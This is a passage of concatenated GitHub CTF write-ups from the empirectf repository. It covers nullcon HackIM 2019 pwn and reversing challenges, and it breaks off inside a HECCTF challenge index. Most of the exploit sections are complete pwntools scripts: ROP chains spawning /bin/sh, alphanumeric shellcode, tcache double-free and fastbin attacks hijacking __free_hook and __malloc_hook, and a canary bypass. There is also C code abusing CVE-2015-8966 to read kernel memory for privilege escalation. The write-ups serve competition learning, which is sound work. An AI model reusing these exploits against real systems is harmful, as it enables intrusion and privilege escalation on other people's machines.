b09->b04\nprog_addr = leak(\"2\\x00\") - p.symbols[\"do_leak\"]\nwrite(stack_addr + 0x18, p8(0x04)) # b09->b04\nprint hex(stack_addr), hex(prog_addr)\n\nfini_arr = prog_addr + p.symbols[\"__do_global_dtors_aux_fini_array_entry\"]\ndo_overwrite = p64(prog_addr + p.symbols[\"do_overwrite\"])\ncsu_fini = p64(prog_addr + p.symbols[\"__libc_csu_fini\"])\nfill_stack(\"nop\")\n\ninit_ret = stack_addr - 72\n\nwrite(fini_arr + 8, do_overwrite) #write 2nd entry of fini_arr\nwrite(fini_arr, do_overwrite) #write 1st entry of fini_arr\nwrite(init_ret, csu_fini) #write return address to csu_fini\n\ninit_ret += 8\n\ndef write_qword(addr, val):\n\tglobal init_ret\n\twrite(init_ret, csu_fini)\n\tinit_ret += 8\n\twrite(addr, p64(val))\n\npop_rdi = p64(prog_addr + 0x84fa)\npop_rsi = p64(prog_addr + 0xd9f2)\npop_rdx = p64(prog_addr + 0x484c5)\npop_rax = p64(prog_addr + 0x460ac)\nsyscall = p64(prog_addr + 0x4610e)\nbin_sh_buf = prog_addr + 0x2b4500\n\nrop = pop_rdi\nrop += p64(bin_sh_buf)\nrop += pop_rsi\nrop += p64(0)\nrop += pop_rdx\nrop += p64(0)\nrop += pop_rax\nrop += p64(59)\nrop += syscall\n\nwrite_qword(bin_sh_buf, u64(\"/bin/sh\\x00\"))\n\nfor i in xrange(0, len(rop), 8):\n\twrite_qword(init_ret + 0x108, u64(rop[i:i+8]))\nraw_input()\nwrite(stack_addr - 16, p64(prog_addr + 0x106f3)) # add rsp,0xd8 ; ret\n\nsh.interactive()\n\n# init_ret = stack_addr + 0x18\n# for i in xrange(0, 0x100, 8):\n# \tfill_stack('A' * 15)\n# \twrite(init_ret + i, p64(prog_addr + p.symbols[\"do_leak\"]))\n```\n\n## 1118daysober\n\nSearching for `CVE-2015-8966`, we can find the patch for this vulnerability [here](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=76cc404bfdc0d419c720de4daaf2584542734f42). So this is a 32-bit ARM Linux kernel privilege escalation challenge. A `qemu` environment is given. If you want to learn more about kernel exploitation environment configuration, you can read it [here](https://mem2019.github.io/jekyll/update/2019/01/11/Linux-Kernel-Pwn-Basics.html); the only difference is that this article is about `x86-64` Linux kernel exploitation, so we use `gdb-multiarch` and `arm-linux-gnueabi-gcc` instead. After reading and comparing the codes before patch and codes after patch, we can find the only difference: for case `F_OFD_GETLK`,`F_OFD_SETLK` and `F_OFD_SETLKW`, the `fs` is not set back after calling `set_fs(KERNEL_DS)`. So what does this function do? What I've found is this\n\n> The original role of `set_fs()` was to set the `x86` processor's `FS` segment register which, in the early days, was used to control the range of virtual addresses that could be accessed by unprivileged code. The kernel has, of course, long since stopped using `x86` segments this way. In current kernels, `set_fs()` works by setting a global variable called `addr_limit`, but the intended functionality is the same: unprivileged code is only allowed to dereference addresses that are below `addr_limit`. The kernel's `access_ok()` function, used to validate user-space accesses throughout the kernel, is a simple check against `addr_limit`, with the rest of the protection being handled by the processor's memory-management unit. \n>\n> [https://lwn.net/Articles/722267/](https://lwn.net/Articles/722267/)\n\nWhat it means is that if `set_fs(KERNEL_DS)` is called and not set back, we can use `read` and `write` to access kernel memory.\n\nThen I tried to use `fcntl` to trigger the vulnerability, but it fails and the breakpoint on `sys_oabi_fcntl64` does not work. Then I found `fcntl` and `fcntl64` are 2 different `syscall`.\n\n![1548009270898](5C1548009270898.png)\n\nBut after checking the binary, the `syscall number` is indeed `0xdd`, which got me confused.\n\nFinally, I found the way to trigger the vulnerability [here](https://bbs.pediy.com/thread-214585.htm)\\(content in Chinese\\), which uses `swi` to call `sys_oabi_fcntl64` instead of `svc 0`. After then, we can use `read` and `write` to access the kernel memory. But note, we cannot use direct access since that is handled by `MMU`. Then we can use unnamed pipe or a regular file. But note:\n\n1. after calling `set_fs(KERNEL_DS)`, `read(fd_file_or_pipe, user_addr, size)` will cause kernel panic.\n2. after calling `set_fs(KERNEL_DS)`, `write(fd_file_or_pipe, kernel_unmapped_addr, size)` will also cause kernel panic.\n\nThese are 2 problems that got me stuck for many hours. For the first one, we can solve it by calling `fork` and call `set_fs(KERNEL_DS)` for child process only, then `write` in the child process to get kernel data, and call `read` in parent process to receive the kernel data. For the second one, we can use `write(1, kernel_addr, 8)` to try to output the kernel data to `stdout`, which will not cause segmentation fault. Only if it returns `8`, that means that page is mapped so we can write it to pipe without kernel panic. Here is my implementation of `memcpy_kernel_page`, which copy a page from `src`(kernel address) to global variable `page`.\n\n```c\nvoid error_exit(const char* msg)\n{\n\twrite(2, msg, strlen(msg));\n\texit(-1);\n}\nssize_t memcpy_kernel_page(char* src)\n{\n\tssize_t ret;\n\tmemset(page, 0, PAGE_SIZE);\n\tint fd[2];\n\tret = pipe(fd);\n\tif (ret < 0) error_exit(\"pipe failed\");\n\tpid_t proc = fork();//handle problem 1\n\tif (proc < 0) error_exit(\"fork failed\");\n\tif (proc == 0)\n\t{//child\n\t\tclose(fd[0]);\n\t\tset_fs();//trigger vulnerability\n\t\tif (write(1, src, 8) != 8)\n\t\t\terror_exit(\"write kmem failed\"); //handle problem 2\n\t\tif (write(fd[1], src, PAGE_SIZE) != PAGE_SIZE)\n\t\t\terror_exit(\"write kmem failed\");\n\t\tclose(fd[1]);\n\t\texit(0);\n\t}\n\telse\n\t{//parent\n\t\tint status;\n\t\tclose(fd[1]);\n\t\twait(&status);\n\t\tif (WIFEXITED(status) && WEXITSTATUS(status) == 0)\n\t\t\tret = PAGE_SIZE;\n\t\telse\n\t\t\tret = -1;\n\t\tif (read(fd[0], page, PAGE_SIZE) <= 0)\n\t\t\terror_exit(\"read kmem failed\");\n\t\tclose(fd[0]);\n\t\tif (ret > 0)\n\t\t\tprintf(\"read kernel memory successfully, first QWORD %p, last QWORD %p\\n\",\n\t\t\t\t*(uintptr_t*)page, *(uintptr_t*)(page + PAGE_SIZE - sizeof(uintptr_t)));\n\n\t\treturn ret;\n\t}\n}\n```\n\nThe way to escalate privilege is to write `cred`. Firstly we can find the `cred` by brute force `comm`. The approach is same as the technique used in [stringIPC](https://poppopret.org/2015/11/16/csaw-ctf-2015-kernel-exploitation-challenge/). However, here is where I failed to solve the challenge in CTF: the maximum string length for `comm` is `15` instead of `16`, with a `\\x00` added at `index 15`, but I used string with length of `16`, which will cause the last byte to be truncated thus unmatched when using `memmem(page, PAGE_SIZE, COMM, 16)` to scan the memory!!! :\\(\n\nHere is the final [exploit](exp.c).\n", "timestamp": "2025-10-24T11:39:16.079039"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-02-01-nullcon-HackIM/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-02-01-nullcon-HackIM/README.md", "content": "## easy-shell\n\nThe logic is simple, a `RWX` page is allocated from `mmap`, and we can execute arbitrary codes but contents must be `alphanum`. I used this [tool](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder). However, the only problem is that this generator requires `rax` to be near the `shellcode` and `rax + padding_len == shellcode address`, but `rax` is `0` when our `shellcode` is executed. Thus, we can add `push r12; pop rax` in front of our payload and let `padding_len == 3`, which is the length of `push r12; pop rax`.\n\n```python\nfrom pwn import *\ncontext(arch='amd64')\n\nfile_name = \"flag\".ljust(8, '\\x00')\n\nsc = '''\nmov rax,%s\npush rax\nmov rdi,rsp\nmov rax,2\nmov rsi,0\nsyscall\n\nmov rdi,rax\nsub rsp,0x20\nmov rsi,rsp\nmov rdx,0x20\nmov rax,0\nsyscall\n\nmov rdi,0\nmov rsi,rsp\nmov rdx,0x20\nmov rax,1\nsyscall\n\n''' % hex(u64(file_name))\nsc = asm(sc)\nprint asm(\"push r12;pop rax;\") + alphanum_encoder(sc, 3)\n```\n\nActually, by the way, `peasy-shell` can be done in the same way: just add more `push xxx; pop xxx;` to fill first page, and fill the second page with real payload being generated, which is `RWX`.\n\n## HackIM Shop\n\nA typical UAF and double free challenge. Firstly leak the address in `got` table to leak `libc` and find its version in `libc-database`, which is `2.27`, the same one in `Ubuntu 18.04 LTS`. This can be done by UAF and control the `pointer` field in the `struct`.\n\nThen, since it is `2.27`, the `tcache` is used instead, so we can use `double free` to poison the `tcache` and `malloc` the chunk onto `__free_hook`, then rewrite it to `system` to get the shell.\n\n`exp.py`\n\n```python\nfrom pwn import *\nimport json\ng_local=True\ncontext.log_level='debug'\np = ELF('./challenge')\ne = ELF(\"./libc6_2.27.so\")\nif g_local:\n\tsh = process('./challenge')#env={'LD_PRELOAD':'./libc.so.6'}\n\tONE_GADGET_OFF = 0x4526a\n\tUNSORTED_OFF = 0x3c4b78\n\tgdb.attach(sh)\nelse:\n\tONE_GADGET_OFF = 0x4526a\n\tUNSORTED_OFF = 0x3c4b78\n\tsh = remote(\"pwn.ctf.nullcon.net\", 4002)\n\t#ONE_GADGET_OFF = 0x4557a\n\ndef add(name, name_len, price=0):\n\tsh.sendline(\"1\")\n\tsh.recvuntil(\"name length: \")\n\tsh.sendline(str(name_len))\n\tsh.recvuntil(\"name: \")\n\tsh.sendline(name)\n\tsh.recvuntil(\"price: \")\n\tsh.sendline(str(price))\n\tsh.recvuntil(\"> \")\n\ndef remove(idx):\n\tsh.sendline(\"2\")\n\tsh.recvuntil(\"index: \")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"> \")\n\ndef view():\n\tsh.sendline(\"3\")\n\tret = sh.recvuntil(\"{\")\n\tret += sh.recvuntil(\"[\")\n\tret += sh.recvuntil(\"]\")\n\tret += sh.recvuntil(\"}\")\n\tsh.recvuntil(\"> \")\n\treturn ret\n\nadd(\"0\", 0x38)\nadd(\"1\", 0x68)\nadd(\"2\", 0x68)\nremove(0)\nremove(1)\n#0x40 1 -> 0 -> 0 data\n\nfake_struct = p64(0)\nfake_struct += p64(p.got[\"puts\"])\nfake_struct += p64(0) + p8(0)\n\nadd(fake_struct, 0x38) #3\nleak = view()\nlibc_addr = u64(leak[0x2e:0x2e+6] + '\\x00\\x00') - e.symbols[\"puts\"]\nprint hex(libc_addr)\n\nadd(\"4\", 0x68)\n\n#now bins are clear\n\nadd(\"5\", 0x68)\nadd(\"/bin/sh\\x00\", 0x68) #6\nadd(\"/bin/sh\\x00\", 0x38)\nadd(\"/bin/sh\\x00\", 0x68)\nadd(\"/bin/sh\\x00\", 0x68)\nadd(\"/bin/sh\\x00\", 0x68)\nadd(\"/bin/sh\\x00\", 0x68)\nadd(\"/bin/sh\\x00\", 0x68)\n\nremove(5)\nremove(5)\nremove(7) #prevent 0x40 from being used up\n\nadd(p64(libc_addr + e.symbols[\"__free_hook\"]), 0x68)\n\nadd(\"consume\", 0x68)\n\ngots = [\"system\"]\n\nfake_got = \"\"\nfor g in gots:\n\tfake_got += p64(libc_addr + e.symbols[g])\nadd(fake_got, 0x68)\n\nsh.sendline(\"2\")\n\nsh.recvuntil(\"index: \")\nsh.sendline(str(6))\nsh.interactive()\n```\n\n## babypwn\n\nThis challenge *seems* to be a format once string vulnerability, but there is nothing exploitable. The only address we have without leak is the program address `0x400000`, but there is nothing writable(neither `got table` nor `_fini_array`). The only possible write are `stdin` and `stdout`, but they will not be used before the program exits so it is useless to hijack their virtual tables.\n\nThen I found another exploitable vulnerability\n\n```c\nif ( (char)uint8 > 20 )\n{\n  perror(\"Coins that many are not supported :/\\r\\n\");\n  exit(1);\n}\nfor ( i = 0; i < uint8; ++i )\n{\n  v6 = &v10[4 * i];\n  _isoc99_scanf((__int64)\"%d\", (__int64)v6);\n}\n```\n\nThe check regard variable `uint8` as an `signed char` but it will be used as `unsigned char` later, so the value `> 0x7f` will pass the check and cause the stack overflow.\n\nHowever, there is canary so we need to bypass this, but we cannot leak it since vulnerable `printf` is after this stack overflow. The key thing is there is no check against the return value of `scanf`, so we can let `scanf` to have some error so that `&v10[4 * i]` will not be rewritten and canary will remain unchanged. Then after we jump over the canary we can rewrite the return address and construct ROP chain. But how to make it have error? Initially I tried `\"a\"(any letter)`, but this fails, because even if the `scanf` returns with error in this iteration, it will also return directly with error later on without receiving any input so we cannot rewrite return address. It seems that the reason is that `\"a\"` does not comply the format `\"%d\"` so it will never be consumed by this `scanf(\"%d\")`. So can we input something that satisfy format `\"%d\"` but still cause the error? I then came up with `\"-\"`, because `\"%d\"` allows negative number so the negative sign should be fine, but a single negative sign does not make any sense as a number so it will cause error. Then it works!\n\nFinally the things became easy, just regard this as a normal stack overflow challenge, and I did not use that format string vulnerability\n\nBy the way, the `libc` version can be found by using format string vulnerability to leak address in `got` table, and search it in the `libc-database`\n\n```python\nfrom pwn import *\nimport json\ng_local=True\ncontext.log_level='debug'\np = ELF('./challenge')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\nONE_GADGET_OFF = 0x4526a\nif g_local:\n\tsh = process('./challenge')#env={'LD_PRELOAD':'./libc.so.6'}\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"pwn.ctf.nullcon.net\", 4001)\n\nPOP_RDI = p64(0x400a43)\ndef exploit_main(rop):\n\tsh.recvuntil(\"tressure box?\\r\\n\")\n\tsh.sendline('y')\n\tsh.recvuntil(\"name: \")\n\tsh.sendline(\"2019\")\n\tsh.recvuntil(\"do you have?\\r\\n\")\n\tsh.sendline(\"128\")\n\n\tfor i in xrange(0,22):\n\t\tsh.sendline(str(i))\n\tfor i in xrange(2):\n\t\tsh.sendline('-') #bypass canary\n\t\tsleep(1)\n\tfor i in xrange(0,len(rop),4):\n\t\tsh.sendline(str(u32(rop[i:i+4])))\n\tfor i in xrange(0,128-22-2-len(rop)/4):\n\t\tsh.sendline(\"0\")\n\tsh.recvuntil(\"created!\\r\\n\")\n\nrop = \"\"\nrop += p64(0)\nrop += POP_RDI\nrop += p64(p.got[\"puts\"])\nrop += p64(p.plt[\"puts\"])\nrop += p64(0x400806) #back to main\n\nexploit_main(rop)\n\nlibc_addr = u64(sh.recvuntil('\\x7f') + '\\x00\\x00') - e.symbols[\"puts\"]\nprint hex(libc_addr)\n\nexploit_main(p64(0) + p64(libc_addr + ONE_GADGET_OFF))\n\nsh.interactive()\n```\n\n## tudutudututu\n\nThe program can create a `todo`, set the `description`, delete and print. \n\nThe `todo` structure is as shown below\n\n```assembly\n00000000 todo            struc ; (sizeof=0x10, align=0x8, mappedto_6)\n00000000 topic           dq ?                    ; offset\n00000008 description     dq ?                    ; offset\n00000010 todo            ends\n```\n\nThe problem is, when creating the `todo` structure, the `description` field is not initialized. This can create UAF and arbitrary read.\n\nFirstly since there is no PIE, we use arbitrary read to leak the address in `got` table, here we can also find the `libc` version, which is `2.23`.\n\nThen, because `topic` is freed before `description`, the `description` is on the top of `topic` in the fast bin if they have same size. In this way if we allocate `todo` again, the UAF caused by no initialization of `description` field can give us heap address.\n\nThen control the `description` field to point to a already freed `0x70` chunk, then set the description to cause double free, which poisons the fast bin and enable the fast bin attack. We can use `0x7f` trick to `malloc` a chunk onto `__malloc_hook`, and hijack the `rip` to `one_gadget`. Since buffer on the stack used to get input is quite large and we can easily set them to `0`, the condition of `one_gadget` can be easily satisfied.\n\n```python\nfrom pwn import *\nimport json\ng_local=True\ncontext.log_level='debug'\np = ELF('./challenge')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\nONE_GADGET_OFF = 0xf1147\nif g_local:\n\tsh = process('./challenge')#env={'LD_PRELOAD':'./libc.so.6'}\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"pwn.ctf.nullcon.net\", 4003)\n\nsh.recvuntil(\"> \")\n\ndef create(topic):\n\tsh.sendline(\"1\")\n\tsh.recvuntil(\"topic: \")\n\tsh.sendline(topic)\n\tsh.recvuntil(\"> \")\n\ndef set_data(topic, data, data_len):\n\tsh.sendline(\"2\")\n\tsh.recvuntil(\"topic: \")\n\tsh.sendline(topic)\n\tsh.recvuntil(\"length: \")\n\tsh.sendline(str(data_len))\n\tsh.recvuntil(\"Desc: \")\n\tsh.sendline(data)\n\tsh.recvuntil(\"> \")\n\ndef delete(topic):\n\tsh.sendline(\"3\")\n\tsh.recvuntil(\"topic: \")\n\tsh.sendline(topic)\n\tsh.recvuntil(\"> \")\n\ndef show(topic):\n\tsh.sendline(\"4\")\n\tsh.recvuntil(topic + \" - \")\n\tret = sh.recvuntil('\\n')\n\tsh.recvuntil(\"> \")\n\treturn ret[:-1]\npayload = 'A' * 8 + p64(p.got[\"puts\"])\ncreate(payload)\ndelete(payload)\n#now 0x20 * 2\n\nunitialzed_todo = \"unitialized data\".ljust(0x30, '_')\ncreate(\"consume 0x20\".ljust(0x30, '_'))\ncreate(unitialzed_todo)\nlibc_addr = u64(show(unitialzed_todo)[:6] + '\\x00\\x00') - e.symbols[\"puts\"]\nprint hex(libc_addr)\n\n#bins empty\n\nleak_todo = \"leak\".ljust(0x60, '_')\ncreate(leak_todo)\nset_data(leak_todo, 'A', 0x60)\ndelete(leak_todo)\ncreate(\"leak\")\n\nheap_addr = u64(show(\"leak\").ljust(8, '\\x00')) - 0x10f0\nprint hex(heap_addr)\n\n#now 0x70 *2\n\nfor i in xrange(3):\n\tcreate(\"tmp\".ljust(0x60, str(i)))\nfor i in [1,0,2]:\n\tdelete(\"tmp\".ljust(0x60, str(i)))\n\n#now 0x20 * 3 + 0x70 * 3\n\npayload = 'A' * 8 + p64(heap_addr + 0x1170)\n\ncreate(payload)\ndelete(payload)\n\nunitialzed_todo = \"unitialized data 2\".ljust(0x30, '_')\ncreate(\"consume 0x20\".ljust(0x30, '_'))\ncreate(unitialzed_todo)\n\nset_data(unitialzed_todo, 'A', 0x10)\n# now 0x70 are poisoned and all others are empty\n\nfor i in xrange(4):\n\tcreate(\"getshell\" + str(i))\n\nset_data(\"getshell0\", p64(libc_addr + e.symbols[\"__malloc_hook\"] - 0x23), 0x60)\nset_data(\"getshell1\", 'a', 0x60)\nset_data(\"getshell2\", 'b', 0x60)\nset_data(\"getshell3\".ljust(0x100, '\\x00'), '\\x00' * 0x13 + p64(libc_addr + ONE_GADGET_OFF), 0x60)\n\nsh.sendline(\"1\")\nsh.recvuntil(\"topic: \")\nsh.sendline(\"123\")\n\nsh.interactive()\n```\n\n## rev3al\n\n### Initialization of VM\n\nThis is a VM reverse challenge, which is a bit complicated but not very hard; it is solvable if enough time was spent.\n\n```c\ntext = (unsigned int *)mmap(0LL, 0xA00uLL, 3, 34, 0, 0LL);\nif ( text != (unsigned int *)-1LL )\n{\n  mem = (unsigned __int8 *)mmap(0LL, 0x100uLL, 3, 34, 0, 0LL);\n  if ( mem != (unsigned __int8 *)-1LL )\n  {\n    jmp_tab = (unsigned int *)mmap(0LL, 0x100uLL, 3, 34, 0, 0LL);\n    if ( text != (unsigned int *)-1LL )\n    {\n//...\n```\n\nInitially, 3 pages are allocated by `mmap`.\n\nThen input is obtained by `cin`\n\n```c\ninput.ptr = input.data;\ninput.size = 0LL;\ninput.data[0] = 0;\nstd::operator<<<std::char_traits<char>>(&std::cout, \"Go for it:\\n\");\nstd::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin, &input);\nif ( input.size - 1 > 0xD )             // <= 0xe == 14\n  exit(1);\n```\n\nWhile the definition of `std::string` in `x86-64 Linux` is\n\n```assembly\n00000000 std::string     struc ; (sizeof=0x20, align=0x8, mappedto_10)\n00000000 ptr             dq ?                    ; XREF: main+BC/w\n00000008 size            dq ?                    ; XREF: main+C0/w\n00000010 data            db 16 dup(?)            ; XREF: main+B8/o\n00000020 std::string     ends\n```\n\nSince the length here is not longer than 16 bytes (<= 14), the last 16 bytes are always `char array` instead of pointer to heap.\n\nThen `mem` and `jmp_tab` are initialized to 0 in weird but fast way, which are not important. Then input is copied to `mem+200`, and virtual registers of the VM is initialized to 0. (I actually found them to be registers later when I was analyzing the VM)\n\n```c\nqmemcpy(mem + 200, input.ptr, 14uLL);   // input size == 14\ni = 5;\ndo\n{\n  a2a = 0;\n  vector::push_back(&regs, &a2a);\n  --i;\n}\nwhile ( i );\n```\n\nThe `regs` are `std::vector`, and each element is `uint8_t`. I found it to be `std::vector` and the function to be `push_back` by debugging and guessing. (It is quite unreasonable to reverse the STL lib function)\n\nThe definition of `std::vector<uint8_t>` is as shown\n\n```assembly\n00000000 std::vector     struc ; (sizeof=0x18, mappedto_11)\n00000000 ptr             dq ?                    ; XREF: main:loc_1EF3/r\n00000008 end             dq ?                    ; XREF: main+277/w ; offset\n00000010 real_end        dq ?                    ; offset\n00000018 std::vector     ends\n```\n\nThen it is the codes to initialize and run the VM.\n\n```c\nregs.ptr[3] = 0;\ntmp.ptr = tmp.data;\nstd::string::assign(&tmp, chal1.ptr, &chal1.ptr[chal1.size]);\nvm_init(&tmp);\nif ( tmp.ptr != tmp.data )\n  operator delete(tmp.ptr);\nvm_run();\n```\n\n`tmp` is also `std::string`, and `std::string::assign` assign the value of `chal1` to `tmp`. Where is `chal1` defined? By using cross reference in IDA, we found that it is initialized in function `0x2042`, which is declared in `_init_array` and will be called before `main` function. Except some basic C++ initialization stuff, it also assign `\"chal.o.1\"` to `chal1` and assign `\"chal.o.2\"` to `chal2`, which are obviously the file names of files being provided.\n\nBack to the `main` function. In function `vm_init`, it simply loads the file into `text` memory page. There are many C++ stuff in this function and they are hard to read, but luckily they are not important so we do not need to focus on them.\n\n```c++\nstd::istream::read(&v5, (char *)text, v2);    // critical step\n```\n\nThe logic that cause the correct information to be outputted is easy: after running first VM `mem[1]` must be true, and after running second VM `mem[2]` must be true. Even if it can also be the case that `mem[2]` becomes true and `mem[1]` remains 0 after the first VM, this is not very possible I guess, otherwise the file `\"chal.o.2\"` will be useless.\n\n### VM Analysis\n\nThe `vm_run` function is as shown\n\n```c\nvoid __cdecl vm_run()\n{\n  unsigned int *t; // rbx\n  unsigned int j; // ecx\n  unsigned int i; // eax\n\n  t = text;\n  j = 0;\n  i = 0;\n  do\n  {\n    if ( (HIWORD(text[i]) & 0xF) == 0xC )       // high word of each instruction\n      jmp_tab[j++] = i;                         // record the index of instruction to jmp tab\n    ++i;\n  }\n  while ( i <= 0x3F && j <= 0x3F );\n  bContiue = 1;\n  do\n    one_instr(t[regs.ptr[3]]);\n  while ( bContiue );\n}\n\nvoid __fastcall one_instr(unsigned int instr)\n{\n  unsigned int high_word; // eax\n  unsigned __int8 dst; // dl\n  unsigned int src; // edi\n  unsigned __int8 *v4; // rdx\n  unsigned __int8 v5; // al\n  unsigned __int8 v6; // cl\n  unsigned __int8 *v7; // rax\n\n  high_word = (instr >> 0x10) & 0xF;\n  dst = instr & 3;\n  src = (instr >> 2) & 3;\n  if ( dst == 3 )\n    dst = 2;\n  if ( (_BYTE)src == 3 )\n    LOBYTE(src) = 2;\n  switch ( (_BYTE)high_word )\n  {\n    case 0:\n      bContiue = 0;\n      break;\n    case 1:\n      if ( regs.ptr[4] )\n        regs.ptr[dst] = mem[regs.ptr[(unsigned __int8)src]] + mem[regs.ptr[dst]];\n      else\n        regs.ptr[dst] += regs.ptr[(unsigned __int8)src];\n      ++regs.ptr[3];\n      break;\n    case 2:\n      if ( regs.ptr[4] )\n        regs.ptr[dst] = mem[regs.ptr[dst]] - mem[regs.ptr[(unsigned __int8)src]];\n      else\n        regs.ptr[dst] -= regs.ptr[(unsigned __int8)src];\n      ++regs.ptr[3];\n      break;\n    case 3:\n      if ( regs.ptr[4] )\n        regs.ptr[dst] = mem[regs.ptr[dst]] * mem[regs.ptr[(unsigned __int8)src]];\n      else\n        regs.ptr[dst] *= regs.ptr[(unsigned __int8)src];\n      ++regs.ptr[3];\n      break;\n    case 4:\n      if ( regs.ptr[4] )\n      {\n        v4 = &regs.ptr[dst];\n        v5 = mem[*v4] / mem[regs.ptr[(unsigned __int8)src]];\n      }\n      else\n      {\n        v4 = &regs.ptr[dst];\n        v5 = *v4 / regs.ptr[(unsigned __int8)src];\n      }\n      *v4 = v5;\n      ++regs.ptr[3];\n      break;\n    case 5:\n      if ( regs.ptr[4] )\n        v6 = mem[regs.ptr[(unsigned __int8)src]];\n      else\n        v6 = regs.ptr[(unsigned __int8)src];\n      regs.ptr[dst] = v6;\n      ++regs.ptr[3];\n      break;\n    case 6:\n      if ( regs.ptr[4] )\n        mem[regs.ptr[dst]] = mem[regs.ptr[(unsigned __int8)src]];\n      else\n        mem[regs.ptr[dst]] = regs.ptr[(unsigned __int8)src];\n      ++regs.ptr[3];\n      break;\n    case 7:\n      regs.ptr[3] = regs.ptr[dst];\n      break;\n    case 8:\n      regs.ptr[4] = (regs.ptr[4] ^ 1) & 1;\n      ++regs.ptr[3];\n      break;\n    case 9:\n      if ( regs.ptr[dst] )\n      {\n        ++regs.ptr[3];\n      }\n      else if ( regs.ptr[4] )\n      {\n        regs.ptr[3] += regs.ptr[(unsigned __int8)src];\n      }\n      else\n      {\n        regs.ptr[3] = regs.ptr[(unsigned __int8)src];\n      }\n      break;\n    case 10:\n      regs.ptr[dst] = src;\n      ++regs.ptr[3];\n      break;\n    case 11:\n      if ( regs.ptr[4] )\n      {\n        v7 = &mem[regs.ptr[dst]];\n        ++*v7;\n      }\n      else\n      {\n        ++regs.ptr[dst];\n      }\n      ++regs.ptr[3];\n      break;\n    case 12:\n      ++regs.ptr[3];\n      break;\n    default:\n      std::operator<<<std::char_traits<char>>(&std::cerr, \"Invalid instruction!\\n\");\n      exit(1);\n      return;\n  }\n}\n```\n\nEach instruction is 4-bytes; there are 4 registers that can be directly accessed by the VM program; the opcode is 4 bits; `r4` controls a \"mode\", and some instructions will perform differently when the `r4` is different.\n\nThen it takes some time to write a [disassembler](disasm.py), and after then we can disassemble these 2 files to further analyze.\n\n### VM Program Analysis\n\nAfter generating the assembly codes of this VM, we found that it would use some operations to produce a specific constant, because the only possible immediate numbers in this instruction set are `0-3`. It will produce `200` at the beginning, which is the address of our input, and then store it at address `0` for further usage. After analyzing a few characters of the input, I found the pattern that it will load the input character into register, minus it by a particular number, and compare it with zero. The program will stop if the result is not zero. My approach is to translate the assembly into Python, and set the inputs to zero. When comparing the input with zero, we output the negation of the character, which is the correct input. Here is the translated [script](1.py).\n\nNote: we need to change all these things:\n\n1. `switch` instruction, which is useless\n2. all arithmetic operation must have a `%0x100` after it\n3. all memory read/write to array accessing\n4. all conditional jumps to print negation of the condition\n\n```\naccessing 200\nw\naccessing 0\naccessing 204\n1\naccessing 0\naccessing 213\nt\naccessing 0\naccessing 201\nh\naccessing 0\naccessing 207\nD\naccessing 0\naccessing 203\nN\naccessing 0\naccessing 210\nk\naccessing 0\naccessing 205\nT\naccessing 0\naccessing 211\n----------86\n`\naccessing 1\n256\naccessing 0\naccessing 206\ns\naccessing 0\naccessing 212\nu\naccessing 0\naccessing 202\n3\naccessing 0\naccessing 208\n4\n```\n\n\n\nThen just inspect the output and reconstruct the flag.\n\nBut, except character at `[11]`, is `[11] * 2 - 86 == 10`. Since it multiplies the character by 2, the previous method does not work, so we must solve this manually, which is `'0'`. This actually takes me some time.\n\nSo the final flag is `wh3N1TsD4?k0ut`, while the `?` seems to be any character.\n", "timestamp": "2025-10-24T11:39:16.598098"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-03-09-HECCTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-03-09-HECCTF/README.md", "content": "# 2019-03-09-HECCTF #\n\n[Website](https://hecc.io)\n\n**Note:** the actual traffic captures were not kept and the challenge sources were not released, which is why a lot of the writeups are rather incomplete.\n\n## Challenges  ##\n\n### Crypto ###\n\n - [x] [500 s3cr3t c0d3z](#500-crypto--s3cr3t-c0d3z)\n - [ ] [800 Flag Generator 5000](#800-crypto--flag-generator-5000)\n - [x] [2500 I LOVE BASS!!!](#2500-crypto--i-love-bass)\n - [x] [2000 Send^Receive](#2000-crypto--sendreceive)\n - [x] [3000 Seeded Sequence](#3000-crypto--seeded-sequence)\n\n### Exploit ###\n\n - [ ] [2700 Vulnerable](#2700-exploit--vulnerable)\n - [x] [4300 Imjur](#4300-exploit--imjur) (partially solved)\n\n### Forensics ###\n\n - [ ] [4800 SD Card](#4800-forensics--sd-card) (partially solved)\n - [ ] [1200 Can you hear me?](#1200-forensics--can-you-hear-me)\n - [ ] [6000 Data Leak](#6000-forensics--data-leak)\n\n### Miscellaneous ###\n\n - [x] [1000 Hacking the air](#1000-miscellaneous--hacking-the-air)\n - [x] [1500 Language Matters (Palo Alto)](#1500-miscellaneous--language-matters-palo-alto)\n - [x] [2200 PreCTF](#2200-miscellaneous--prectf)\n - [ ] [4800 Kiosk](#4800-miscellaneous--kiosk)\n\n### Networking ###\n\n - [x] [400 Digging for Gold](#400-networking--digging-for-gold)\n - [x] [800 Free Token](#800-networking--free-token)\n - [x] [800 Say please](#800-networking--say-please)\n - [x] [800 TAG! You're it!](#800-networking--tag-youre-it)\n - [x] [800 All of the lights!](#800-networking--all-of-the-lights)\n - [ ] [2500 Pick up the phone!](#2500-networking---pick-up-the-phone)\n - [ ] [1500 Miner](#1500-networking--miner)\n - [ ] [3000 Flappy Boot](#3000-networking--flappy-boot)\n - [ ] [5400 SecurEmessage 9000](#5400-networking--securemessage-9000)\n\n### Physical ###\n\n - [x] [3000 NFC](#3000-physical--nfc)\n - [x] [5300 Broken Codes](#5300-physical--broken-codes)\n\n### Programming ###\n\n - [x] [1000 Hulk Smash!!](#1000-programming--hulk-smash)\n - [x] [2500 Recursive (Palo Alto)](#2500-programming--recursive-palo-alto)\n\n### Reverse-Engineering ###\n\n - [x] [1800 Defuse the Bomb!](#1800-reverse-engineering--defuse-the-bomb)\n - [ ] [3000 SharpCrypt](#3000-reverse-engineering--sharpcrypt)\n - [x] [2500 Something's Missing](#2500-reverse-engineering--somethings-missing)\n - [x] [2000 Treasure Island](#2000-reverse-engineering--treasure-island)\n - [ ] [3500 